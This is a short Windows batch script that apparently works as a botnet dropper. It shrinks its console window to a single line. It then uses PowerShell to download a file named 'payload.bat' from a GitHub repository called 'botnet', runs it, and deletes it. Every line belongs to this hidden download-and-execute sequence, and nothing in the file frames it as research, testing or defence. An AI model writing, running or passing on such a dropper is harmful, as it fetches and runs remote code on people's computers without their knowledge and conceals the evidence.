@echo off
mode con: cols=20 lines=1
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/unfunnylaugh/botnet/main/payload.bat', 'C:\Users\%username%\Downloads\payload.bat')"
start C:\Users\%username%\Downloads\payload.bat

timeout /t 1 /nobreak >nul
del C:\Users\%username%\Downloads\payload.bat
